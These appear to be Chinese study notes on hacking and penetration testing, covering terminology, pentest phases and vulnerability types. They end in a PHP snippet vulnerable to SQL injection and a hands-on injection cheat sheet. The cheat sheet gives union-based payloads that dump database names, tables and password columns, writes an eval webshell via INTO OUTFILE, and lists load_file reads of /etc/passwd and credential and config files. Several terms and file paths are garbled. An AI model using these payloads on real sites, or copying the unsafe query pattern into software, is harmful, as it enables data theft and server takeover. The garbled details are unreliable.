# 网络安全

- 黑客(高级程序员)
- 骇客(DDOS)
- 红客(中国) Honcker

## 什么事黑客

> software cracker

- 白帽子
  - 专门研究或者从事网络安全行业的人，通常收骨玉各大安全公司，是提高网络、系统安全水平的主要力量
- 黑帽子
  - 专门研究木马、操作系统、寻找漏洞，并且以个人意志为出发点，攻击网络或者计算机
- 灰帽子
  - 专门研究木马、操作系统、寻找漏洞，并且以个人意志为出发点，攻击网络或计算机

## 黑客传奇

- Richard Stallman
- 史蒂夫 沃兹尼亚克
- linus
- ken tompson and Dannis Richard

## 骇客

- Kevin David Mitnick
- Adrian Lamo
- Jonathan James

## 黑客专业术语

- 病毒(编程死循环)和木马(蠕虫)
- webshell：通过web入侵的一种脚本工具，可以据此对网站服务进行一定程度的控制
- 肉鸡：被黑客入侵被长期驻扎的计算机或服务器
- 抓鸡：利用使用量大的程序的漏洞，使用自动化方式获取肉鸡的行为
- 漏洞：硬件、软件、协议等可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等。
- 木马：通过向服务端提交一句简短的代码，配合本地客户端实现 webshell 功能的木马
- exp: exploit 利用工具
- poc: 验证漏洞
- 提权：OS低权限的账户将自己提升为管理员权限使用的方法 
- 后门：黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个**入口**
- 旁站入侵：同一个服务器入侵之后通过提权跨目录等手段拿到目标网站的权限
  - 旁站查询工具：WebRobot, 御剑，明小子，Web在线查询
- C 端入侵：即同 C 端下服务器入侵。如目标ip为192.168.1.253 入侵 192.168.1.* 的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。常用的工具有：Windows下的 Cain， Unix下有 Sniffit, Snoop, Tcpdump, Dsniff 等
- 渗透：利用漏洞
- 远程控制服务器
- root/administrator

## 渗透测试

- 黑河测试：在未授权的情况下，模拟黑客的攻击方法和思维方式，来评估计算机网络系统可能存在的安全风险。黑盒测试不同于黑客入侵，并不等于黑站。黑河测试考研的是中和的能力（OS, DB, Script, code, 思路，社工）

- 白盒测试：从内部处罚，知道源代码，代码审计

## 各种攻击

- APT攻击：Advanced Persistent Threat， 高级可持续性攻击，是指阻止（特别是ZF）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式

1. 极强的隐蔽性
2. 潜伏期长，持续性强
3. 目标性强

## 渗透测试流程

- 渗透测试 VS 入侵

1. 明确目标

- 确定范围
- 确定规则
- 确定需求

2. 信息收集

- 基础信息
- 系统信息
- 应用信息
- 版本信息
- 服务信息
- 人员信息
- 防护信息

3. 漏洞探测

- 系统漏洞
- WebServer 漏洞
- Web 应用漏洞
- 其他端口服务漏洞
- 通信安全

4. 漏洞验证

- 自动化验证
- 手工验证
- 试验验证
- 登录猜解
- 公开资源利用

5. 信息分析

- 精准打击
- 绕过防御机制
- 定制攻击路径
- 绕过检测机制
- 攻击代码

6. 获取所需

- 实施攻击
- 获取内部信息
- 进一步渗透
- 持续性存在
- 清理痕迹

7. 信息整理

- 整理渗透攻击
- 整理收集信息
- 整理漏洞信息

8. 形成报告

- 按需整理
- 补充介绍
- 修补建议

## 经验分享

- 信息收集是关键
- 多看源码
- 多收集 0day

![渗透测试流程](./images/flow.png)

## 如何学习黑客技术

- 乌云
- i春秋
- freebuf
- 米斯特

- PHP 代码审计

- 搜索工具
  - 光速搜索、遍历工具
  
## 基本漏洞类型

- 弱口令 => 爆破\遍历
  - 比如：123456
  - xx.php?info=123

- SQL 注入(GET没有过滤)
- XSS 攻击
- 代码执行、命令执行
- 文件包含：xx.php?include=1.php
- 越权、逻辑
- 配置错误
- 敏感信息泄露


## 虚拟机

1. vm安装
2. 系统安装
3. vm tools
4. 快照创建
5. 网络配置
6. 导入导出
7. 克隆功能
8. 性能优化


### SQL 注入

``` PHP
<?php
$con=mysql_connect("localhost","root","root");
$id=@$_GET['id'];//通过get方式传递id的参数的值
if(!$con){
  die('Could not connect: ' . mysql_error());
}else{
  mysql_select_db("mst");
  $query="select * from $id";
  echo mysql_result(mysql_query($query), 0, "name");//columns
}
?>
```

``` sql
判断是否存在SQL注入
'
and 1=1
and 1=2

暴字段长度
Order by 数字

匹配字段
and 1=1 union select 1,2,..,n

暴字段位置
and 1=2 union select 1,2,..,n
 
利用内置函数暴数据库信息
version() database() user()

不用猜解可用字段暴数据库信息(有些网站不适用):
and 1=2 union all select version()
and 1=2 union all select database()
and 1=2 union all select user()

操作系统信息：
and 1=2 union all select @@global.version_compile_os from mysql.user 

数据库权限：
and ord(mid(user(),1,1))=114  返回正常说明为root
 
暴库 (mysql>5.0)
Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息
and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1

猜表
and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）—

猜字段
and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1

暴密码
and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1

高级用法（一个可用字段显示两个数据内容）：
Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1

直接写马(Root权限)
条件：

1. 知道站点物理路径
2. 有足够大的权限（可以用select …. from mysql.user测试）
3. magic_quotes_gpc()=OFF
select '<?php eval_r($_POST[cmd])?>' into outfile '物理路径'
and 1=2 union all select 一句话HEX值 into outfile '路径'

load_file() 常用路径：

1. replace(load_file(0×2F6574632F706173737764),0×3c,0×20)

2. replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32)) 上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 “<” 替换成”空格” 返回的是网页.而无法查看到代码.

3. load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录

4. /etc tpd/conf tpd.conf或/usr/local/apche/conf tpd.conf 查看linux APACHE虚拟主机配置文件

5. c:\Program Files\Apache Group\Apache\conf \httpd.conf 或C:\apache\conf \httpd.conf 查看WINDOWS系统apache文件

6. c:/Resin-3.0.14/conf/resin.conf 查看jsp开发的网站 resin文件配置信息.

7. c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机

8. d:\APACHE\Apache2\conf\httpd.conf

9. C:\Program Files\mysql\my.ini

10. ../themes/darkblue_orange/layout.inc.php phpmyadmin 爆路径

11. c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置文件

12. /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看

13. /usr/local/resin-pro-3.0.22/conf/resin.conf 同上

14. /usr/local/app/apache2/conf/extra tpd-vhosts.conf APASHE虚拟主机查看

15. /etc/sysconfig/iptables 本看防火墙策略
16. usr/local/app/php5 b/php.ini PHP 的相当设置
17. /etc/my.cnf MYSQL的配置文件
18. /etc/redhat-release 红帽子的系统版本
19. C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码

20. /etc/sysconfig/network-scripts/ifcfg-eth0 查看IP.
21. /usr/local/app/php5 b/php.ini //PHP相关设置
22. /usr/local/app/apache2/conf/extra tpd-vhosts.conf //虚拟网站设置
23. C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini
24. c:\windows\my.ini
25. c:\boot.ini

网站常用配置文件 config.inc.php、config.php。load_file（）时要用replace（load_file(HEX)，char(60),char(32)）

注：

Char(60)表示 <
Char（32）表示 空格

手工注射时出现的问题：

当注射后页面显示：

Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation 'UNION'

如：/instrument.php?ID=13 and 1=2 union select 1,load_file(0x433A5C626F6F742E696E69),3,4,user()

这是由于前后编码不一致造成的，

解决方法：在参数前加上 unhex(hex(参数))就可以了。上面的URL就可以改为：
/instrument.php?ID=13 and 1=2 union select 1,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))
```
